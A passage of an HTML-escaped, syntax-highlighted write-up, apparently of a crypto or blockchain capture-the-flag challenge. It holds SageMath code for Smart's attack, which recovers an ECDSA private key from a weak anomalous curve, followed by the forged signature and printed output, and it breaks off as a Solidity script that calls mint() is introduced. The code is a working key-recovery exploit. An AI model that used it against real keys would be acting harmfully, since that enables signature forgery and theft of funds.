&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SmartAttack&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;P&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;p&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;    E &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;P&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;curve&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    Eqp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;EllipticCurve&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Qp&lt;&#x2F;span&gt;&lt;span&gt;(p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;[ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ZZ&lt;&#x2F;span&gt;&lt;span&gt;(t) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;p)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;E&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;a_invariants&lt;&#x2F;span&gt;&lt;span&gt;() ])
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    P_Qps &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Eqp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lift_x&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ZZ&lt;&#x2F;span&gt;&lt;span&gt;(P&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;all&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;P_Qp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;P_Qps:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(p)(P_Qp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;P&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    Q_Qps &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Eqp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;lift_x&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ZZ&lt;&#x2F;span&gt;&lt;span&gt;(Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;])&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;all&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;True&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;Q_Qp &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;Q_Qps:
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;GF&lt;&#x2F;span&gt;&lt;span&gt;(p)(Q_Qp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;]:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    p_times_P &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;P_Qp
&lt;&#x2F;span&gt;&lt;span&gt;    p_times_Q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;Q_Qp
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    x_P,y_P &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;p_times_P&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    x_Q,y_Q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;p_times_Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    phi_P &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= -&lt;&#x2F;span&gt;&lt;span&gt;(x_P&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;y_P)
&lt;&#x2F;span&gt;&lt;span&gt;    phi_Q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= -&lt;&#x2F;span&gt;&lt;span&gt;(x_Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;y_Q)
&lt;&#x2F;span&gt;&lt;span&gt;    k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;phi_Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;phi_P
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ZZ&lt;&#x2F;span&gt;&lt;span&gt;(k)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ecdsa_sign&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;m&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;  r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;  s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;    k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;      k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;      Q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;k &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;G
&lt;&#x2F;span&gt;&lt;span&gt;      (x1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;      r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fn&lt;&#x2F;span&gt;&lt;span&gt;(x1)
&lt;&#x2F;span&gt;&lt;span&gt;    e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;    s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fn&lt;&#x2F;span&gt;&lt;span&gt;(k) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;r)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;[r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;s]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ecdsa_verify&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;  e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;m
&lt;&#x2F;span&gt;&lt;span&gt;  w &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;^ &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;  u1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(e &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;w)
&lt;&#x2F;span&gt;&lt;span&gt;  u2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(r &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;w)
&lt;&#x2F;span&gt;&lt;span&gt;  P1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Integer&lt;&#x2F;span&gt;&lt;span&gt;(u1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;G
&lt;&#x2F;span&gt;&lt;span&gt;  P2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Integer&lt;&#x2F;span&gt;&lt;span&gt;(u2) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;Q
&lt;&#x2F;span&gt;&lt;span&gt;  X &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;P1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;P2
&lt;&#x2F;span&gt;&lt;span&gt;  (x&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;y) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;X&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;  v &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Fn&lt;&#x2F;span&gt;&lt;span&gt;(x)
&lt;&#x2F;span&gt;&lt;span&gt;  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;v &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;r
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;SmartAttack&lt;&#x2F;span&gt;&lt;span&gt;(G&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;p)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;[r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;s] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ecdsa_sign&lt;&#x2F;span&gt;&lt;span&gt;(d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;m)
&lt;&#x2F;span&gt;&lt;span&gt;result &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;ecdsa_verify&lt;&#x2F;span&gt;&lt;span&gt;(Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;m&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;r&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;s)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Message: &lt;&#x2F;span&gt;&lt;span&gt;{m}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Public Key: &lt;&#x2F;span&gt;&lt;span&gt;{Q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;xy&lt;&#x2F;span&gt;&lt;span&gt;()}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Private Key: &lt;&#x2F;span&gt;&lt;span&gt;{d}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;=== Signature ===&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; r = &lt;&#x2F;span&gt;&lt;span&gt;{r}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot; s = &lt;&#x2F;span&gt;&lt;span&gt;{s}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Verification: &lt;&#x2F;span&gt;&lt;span&gt;{result}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Message: 19666107331951626476415026567086342074650612991336538073686539593437448590271
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Public Key: (228372021298333142209829245091882548944496316312635232236, 3693481507636668030082911526987394375826206080991036294396)
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Private Key: 2590225047465443722024386469461634294729219346156883417670
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# === Signature ===
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#  r = 2195097151127120065579326181785367043581509779126357541128
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#  s = 928540552076520879873320608471470817377985074596666122262
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Verification: True
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;

    &lt;&#x2F;div&gt;
  
&lt;&#x2F;div&gt;
&lt;p&gt;Solidity script to call &lt;code&gt;mint()&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;div class=&quot;note-container&quot;&gt;
  
    &lt;button class=&quot;note-toggle&quot;&gt;
      
        &lt;div class=&quot;note-icon&quot;&gt;
        &lt;p&gt;Fallout.s.sol&lt;&#x2F;p&gt;

        &lt;&#x2F;div&gt;
      
